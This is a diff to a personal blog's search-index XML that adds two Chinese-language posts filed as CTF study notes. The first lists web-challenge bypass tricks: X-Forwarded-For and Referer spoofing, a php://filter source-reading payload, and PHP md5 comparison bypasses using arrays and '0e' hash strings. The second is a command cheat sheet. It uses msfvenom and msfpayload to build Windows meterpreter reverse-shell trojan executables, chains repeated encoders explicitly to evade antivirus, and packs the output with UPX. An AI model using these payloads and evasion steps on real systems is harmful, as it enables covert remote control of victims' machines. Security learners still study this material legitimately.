@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>CTF常见绕过</title>
+      <link href="2020/ctf-chang-jian-rao-guo/"/>
+      <url>2020/ctf-chang-jian-rao-guo/</url>
+      
+        <content type="html"><![CDATA[<h2 id="指定ip访问绕过"><a href="#指定ip访问绕过" class="headerlink" title="指定ip访问绕过"></a>指定ip访问绕过</h2><p>在头中添加 X-Forwarded-For</p><h2 id="php-filter读取任意-php文件"><a href="#php-filter读取任意-php文件" class="headerlink" title="php:filter读取任意.php文件"></a>php:filter读取任意.php文件</h2><p><code>php://filter/read=convert.base64-encode/resource=xx.php</code></p><h2 id="实战常用后门"><a href="#实战常用后门" class="headerlink" title="实战常用后门"></a>实战常用后门</h2><p>使用后门扫描工具</p><h2 id="php双"><a href="#php双" class="headerlink" title="php双$$"></a>php双$$</h2><p>表示可变变量 <a href="https://blog.csdn.net/A757291228/article/details/57083568">https://blog.csdn.net/A757291228/article/details/57083568</a></p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>== 双等于使用 0e方法绕过<br>=== 三等于使用传数组方法绕过<br>有两种方法绕过：<br>1，md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>payload: ?kkeyey1[]=1&amp;kkeyey2[]=2<br>2，利用==比较漏洞<br>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。<br>下列的字符串的MD5值都是0e开头的：<br>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a</p><h2 id="修改HTTP头中的referer伪造访问来源"><a href="#修改HTTP头中的referer伪造访问来源" class="headerlink" title="修改HTTP头中的referer伪造访问来源"></a>修改HTTP头中的referer伪造访问来源</h2><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，<br>告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><h2 id="php常见漏洞总结"><a href="#php常见漏洞总结" class="headerlink" title="php常见漏洞总结"></a>php常见漏洞总结</h2><p><a href="https://xz.aliyun.com/t/3085">https://xz.aliyun.com/t/3085</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络技巧 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msfvenom生成</title>
+      <link href="2020/msfvenom-sheng-cheng/"/>
+      <url>2020/msfvenom-sheng-cheng/</url>
+      
+        <content type="html"><![CDATA[<h2 id="利用msfvenom生成木马程序"><a href="#利用msfvenom生成木马程序" class="headerlink" title="利用msfvenom生成木马程序"></a>利用msfvenom生成木马程序</h2><p>msfvenom -h</p><p>生成meterpreter payload 并利用shikata_ga_nai编码,查看所需选项,利用 -o参数</p><p>msfvenom -p windows/meterpreter/reverse_tcp -o</p><p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.113 X &gt; Desktop/abc.exe</p><p>多次生成可进行免杀:msfpayload windows/shell_reverse_tcp lhost=192.168.128.129 lport=888 r| msfencode -e x86/shikata_ga_nai -c 7 -t raw | msfencode -e x86/alpha_upper -c 3 -t raw | msfencode -e x86/shikata_ga_nai -c 6 -t raw | msfencode -e x86/alpha_upper -c 3 -t exe -o /root/Desktop/acn.exe</p><p>upx加壳：upx -5 /root/Desktop/acn.exe</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络技巧 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>magisk v2ray 食用教程</title>
       <link href="2020/magisk-v2ray-shi-yong-jiao-cheng/"/>
       <url>2020/magisk-v2ray-shi-yong-jiao-cheng/</url>
@@ -20,9 +70,9 @@
       
         <tags>
             
-            <tag> 系统技巧 </tag>
-            
             <tag> 网络技巧 </tag>
+            
+            <tag> 系统技巧 </tag>
             
         </tags>
       
